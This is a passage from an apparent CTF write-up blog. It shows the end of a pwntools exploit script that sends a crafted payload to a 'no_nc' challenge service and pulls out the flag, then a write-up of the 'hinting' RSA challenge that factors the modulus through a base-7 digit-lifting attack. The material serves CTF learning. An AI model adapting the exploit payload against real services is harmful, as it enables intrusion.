</span></span><span style=display:flex><span>off <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> min(<span style=color:#ae81ff>2</span>, len(filename)) <span style=color:#f92672>+</span> <span style=color:#ae81ff>5</span> <span style=color:#f92672>*</span> max(<span style=color:#ae81ff>0</span>, len(filename) <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#         %X$C                        %XX$C                      b&#39;\0&#39;</span>
</span></span><span style=display:flex><span>off <span style=color:#f92672>+=</span> <span style=color:#f92672>-</span>off <span style=color:#f92672>%</span> <span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span>index <span style=color:#f92672>=</span> off <span style=color:#f92672>//</span> <span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> pwn<span style=color:#f92672>.</span>flat([
</span></span><span style=display:flex><span>    <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;%</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>$C&#34;</span><span style=color:#f92672>.</span>encode()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>6</span> <span style=color:#f92672>+</span> index, <span style=color:#ae81ff>6</span> <span style=color:#f92672>+</span> index <span style=color:#f92672>+</span> len(filename))
</span></span><span style=display:flex><span>])<span style=color:#f92672>.</span>ljust(off, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> pwn<span style=color:#f92672>.</span>flat([
</span></span><span style=display:flex><span>    bytes([c])<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>) <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> filename
</span></span><span style=display:flex><span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>assert</span> len(payload) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>200</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pwn<span style=color:#f92672>.</span>log<span style=color:#f92672>.</span>hexdump(payload)
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendline(payload)
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pathlib<span style=color:#f92672>.</span>Path(<span style=color:#e6db74>&#39;nc_remote&#39;</span>)<span style=color:#f92672>.</span>write_bytes(io<span style=color:#f92672>.</span>recvall())
</span></span></code></pre></div><p>After we can grep the flag:</p><p>Copy</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Havoc@kali:~/play/no_nc/no-nc$ strings nc_remote | grep GPN
</span></span><span style=display:flex><span>GPNCTF<span style=color:#f92672>{</span>up_anD_dowN_A1l_aR0UnD_6OES_7h3_n_dimeN5ionAL_CiRcLe_W7f_1S_ThIs_F1ag<span style=color:#f92672>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>GPNCTF<span style=color:#f92672>{</span>up_anD_dowN_A1l_aR0UnD_6OES_7h3_n_dimeN5ionAL_CiRcLe_W7f_1S_ThIs_F1ag<span style=color:#f92672>}</span>
</span></span></code></pre></div><blockquote><p>And friends lets be clear am not good in rv challs so most of the work was done by chat-gpt and i concluded the rest upto the final flag</p></blockquote><blockquote><p><em>The next challenge was a cryptography challenge and this is how i went on with it ,,,it was my first to solve though</em>.</p></blockquote><h2 id=hinting><strong>Hinting</strong></h2><p><img src="https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup10/images/hintingchallenge.png?raw=true" alt=kitctf></p><h2 id=challenge-description>Challenge Description</h2><p>The challenge <code>hinting</code> is a cryptography problem that provides an RSA modulus <code>n</code>, public exponent <code>e</code>, ciphertext <code>c</code>, and a hint <code>V</code>. The hint <code>V</code> is a vector representing <code>(p_i + q_i) % 7</code> for the base-7 digits of the prime factors <code>p</code> and <code>q</code> of <code>n</code>.</p><h2 id=files-provided>Files Provided</h2><ul><li><code>hinting.sage</code>: A SageMath script that generates the challenge parameters.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> secrets
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> bytes_to_long
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>FLAG <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;There was an actual flag here once&#34;</span>
</span></span><span style=display:flex><span>FLAG <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>encode() <span style=color:#66d9ef>if</span> len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>else</span> FLAG
</span></span><span style=display:flex><span>BS <span style=color:#f92672>=</span> <span style=color:#ae81ff>1024</span>
</span></span><span style=display:flex><span>FLAG <span style=color:#f92672>=</span> bytes_to_long(FLAG)
</span></span><span style=display:flex><span>set_random_seed(secrets<span style=color:#f92672>.</span>randbelow(int(<span style=color:#ae81ff>2</span><span style=color:#f92672>**</span><span style=color:#ae81ff>64</span>)))
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> random_prime(<span style=color:#ae81ff>2</span> <span style=color:#f92672>**</span> (BS), lbound<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span> <span style=color:#f92672>**</span> (BS <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> random_prime(<span style=color:#ae81ff>2</span><span style=color:#f92672>**</span> (BS), lbound<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span> <span style=color:#f92672>**</span> (BS <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> p <span style=color:#f92672>*</span> q
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x10001</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> pow(FLAG, e, n)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;n = </span><span style=color:#e6db74>{</span>n<span style=color:#e6db74>:</span><span style=color:#e6db74>x</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;e = </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>:</span><span style=color:#e6db74>x</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;c = </span><span style=color:#e6db74>{</span>int(c)<span style=color:#e6db74>:</span><span style=color:#e6db74>x</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pp, qq <span style=color:#f92672>=</span> (
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>digits(base<span style=color:#f92672>=</span><span style=color:#ae81ff>7</span>, padto<span style=color:#f92672>=</span>int(log(<span style=color:#ae81ff>2</span> <span style=color:#f92672>**</span> (BS <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>7</span>)) <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>),
</span></span><span style=display:flex><span>    q<span style=color:#f92672>.</span>digits(base<span style=color:#f92672>=</span><span style=color:#ae81ff>7</span>, padto<span style=color:#f92672>=</span>int(log(<span style=color:#ae81ff>2</span> <span style=color:#f92672>**</span> (BS <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>7</span>)) <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>),
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>V <span style=color:#f92672>=</span> vector([(pp[i] <span style=color:#f92672>+</span> qq[i]) <span style=color:#f92672>%</span> <span style=color:#ae81ff>7</span> <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(pp))])
</span></span><span style=display:flex><span>print(V)
</span></span></code></pre></div><ul><li><code>output.txt</code>: Contains the values of <code>n</code>, <code>e</code>, <code>c</code>, and the hint vector <code>V</code>.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>n <span style=color:#f92672>=</span> <span style=color:#ae81ff>960</span>f50f6cb18b2767306b4f704785089726d282ef1e40bf946f585f006a7c3588aa0298d4c6b2d57a9fb400ac10216476c0a810a1bba3faa7036ecd2b7ebe4317e4acc5ea35a3bc6e1cd7ba8d9f8a6d35f05bf1a8c54fe17bd14d5146f80715957968856d12c27278d380bf81934dc1b8060be1ae5ea9652a92658a4fc273ad180d2f323058dcc09287d4e41a04edc585c89079048a3f01bd2d617f45e488d55770dfda468d2b71089d1ee86daf287ec88e8333c0185ec941732a924518ac068ee5ba69e6f0b23eccd8445ad22ed74d7fcf1355d19032c604c9c8c9208265a5077f7c03674759f3de432a8b8ac8f3845a8358fbaa607f8770717b973f67d8b6b
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>10001</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>78</span>fe786edf7f78b5c7b0d4edd12ece946f021df730a825a7254dc80dddf8460a946eb25c4257c03a39a89472428534c1a98c0b509a2770ee1828c256941f67535f04ab05716c7ed86c821d821afed9ba4309837b4f3f6077e40c891bf6f3dcb714728c8458a0364562cb714fa9a596c7eccd4eafae6075dbab3f0ea745646fddeae98c058139a3200765b5f526f8807d6c72917218d7b77394da3fa6ab3a292ffc756a5b6b1c52bc58c4a212981da958c6bd6a21cd113cbc93497d5f016d6bc1a02cf77e96c3236d632d71a8b137c14742b3a5842754c35409e8f28126b91d6fa2b2fe4dedc531011ecce8943d2ee332acc3349e6256ce2c84d41aec718b4056
</span></span><span style=display:flex><span>(<span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>)
</span></span></code></pre></div><h2 id=analysis>Analysis</h2><h3 id=hintingsage-analysis><code>hinting.sage</code> Analysis</h3><p>The <code>hinting.sage</code> script reveals the following:</p><ul><li>RSA parameters: <code>n = p * q</code>, <code>e = 0x10001</code>, <code>c = pow(FLAG, e, n)</code>.</li><li><code>BS = 1024</code>: <code>p</code> and <code>q</code> are 1024-bit random primes.</li><li>The hint <code>V</code> is generated by taking the base-7 digits of <code>p</code> (<code>pp</code>) and <code>q</code> (<code>qq</code>), padding them to the same length, and then computing <code>(pp[i] + qq[i]) % 7</code> for each digit position <code>i</code>.</li></ul><p>This means we have partial information about the base-7 digits of <code>p</code> and <code>q</code>. Specifically, for each digit position <code>i</code>, we know <code>(p_i + q_i) mod 7 = V_i</code>.</p><h3 id=outputtxt-analysis><code>output.txt</code> Analysis</h3><p><code>output.txt</code> provides the concrete values:</p><ul><li><code>n</code> (hexadecimal)</li><li><code>e</code> (hexadecimal)</li><li><code>c</code> (hexadecimal)</li><li><code>V</code> (a Python tuple of integers)</li></ul><h2 id=solution-approach-lifting-attack-hensels-lemma-variant>Solution Approach: Lifting Attack (Hensel&rsquo;s Lemma Variant)</h2><p>The problem can be solved using a lifting attack, which is a variant of Hensel&rsquo;s Lemma. The core idea is to reconstruct the prime factors <code>p</code> and <code>q</code> digit by digit in base 7, using the given hint <code>V</code> and the relationship <code>n = p * q</code>.</p><ol><li><p><strong>Initial Digits (p_0, q_0):</strong>
We know that <code>n % 7 = (p % 7) * (q % 7)</code>. Since <code>p % 7 = p_0</code> and <code>q % 7 = q_0</code> (where <code>p_0</code> and <code>q_0</code> are the least significant base-7 digits of <code>p</code> and <code>q</code>), we have <code>n % 7 = (p_0 * q_0) % 7</code>. We also know <code>(p_0 + q_0) % 7 = V[0]</code>. We can iterate through all possible <code>(p_0, q_0)</code> pairs (from 0 to 6) to find the valid starting digits that satisfy both conditions.</p></li><li><p><strong>Iterative Lifting:</strong>
For each subsequent digit position <code>i</code> (from 1 to <code>len(V) - 1</code>):</p><ul><li>We know <code>(p_i + q_i) % 7 = V[i]</code>. Since <code>p_i</code> and <code>q_i</code> are digits in base 7 (0-6), <code>p_i + q_i</code> can be <code>V[i]</code> or <code>V[i] + 7</code> (if there&rsquo;s a carry from the previous digit sum).</li><li>We need to find <code>(p_i, q_i)</code> such that when combined with the already determined lower-order digits, the product <code>p * q</code> matches <code>n</code> modulo <code>7^(i+1)</code>.</li><li>The equation <code>n = p * q</code> can be expanded in base 7. Considering <code>n = (p_0 + 7p_1 + ...) * (q_0 + 7q_1 + ...)</code>.</li><li>At each step <code>i</code>, we have partial <code>p</code> and <code>q</code> values (let&rsquo;s call them <code>p_partial</code> and <code>q_partial</code>) formed by digits up to <code>i-1</code>. We then try all possible <code>(p_i, q_i)</code> pairs (0-6) that satisfy <code>(p_i + q_i) % 7 = V[i]</code>. For each pair, we form <code>p_new = p_partial + p_i * 7^i</code> and <code>q_new = q_partial + q_i * 7^i</code>. We then check if <code>(p_new * q_new) % 7^(i+1) == n % 7^(i+1)</code>.</li><li>If a pair satisfies the condition, we append <code>p_i</code> and <code>q_i</code> to our lists of digits for <code>p</code> and <code>q</code> and proceed to the next digit position.</li></ul></li><li><p><strong>Factorization and Decryption:</strong>
Once all digits are found, we reconstruct the full <code>p</code> and <code>q</code> values. We then verify that <code>p * q == n</code>. If they match, we have factored <code>n</code>. From <code>p</code> and <code>q</code>, we can calculate <code>phi(n) = (p - 1) * (q - 1)</code> and then the private exponent <code>d = pow(e, -1, phi)</code>. Finally, we decrypt the ciphertext <code>c</code> using <code>FLAG = pow(c, d, n)</code>.</p></li></ol><h2 id=implementation-python-script>Implementation (Python Script)</h2><p>The following Python script implements the described lifting attack which i was given by chat gpt,big up my friend you deserve the credit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> bytes_to_long, long_to_bytes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>n_hex <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;960f50f6cb18b2767306b4f704785089726d282ef1e40bf946f585f006a7c3588aa0298d4c6b2d57a9fb400ac10216476c0a810a1bba3faa7036ecd2b7ebe4317e4acc5ea35a3bc6e1cd7ba8d9f8a6d35f05bf1a8c54fe17bd14d5146f80715957968856d12c27278d380bf81934dc1b8060be1ae5ea9652a92658a4fc273ad180d2f323058dcc09287d4e41a04edc585c89079048a3f01bd2d617f45e488d55770dfda468d2b71089d1ee86daf287ec88e8333c0185ec941732a924518ac068ee5ba69e6f0b23eccd8445ad22ed74d7fcf1355d19032c604c9c8c9208265a5077f7c03674759f3de432a8b8ac8f3845a8358fbaa607f8770717b973f67d8b6b&#34;</span>
</span></span><span style=display:flex><span>e_hex <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;10001&#34;</span>
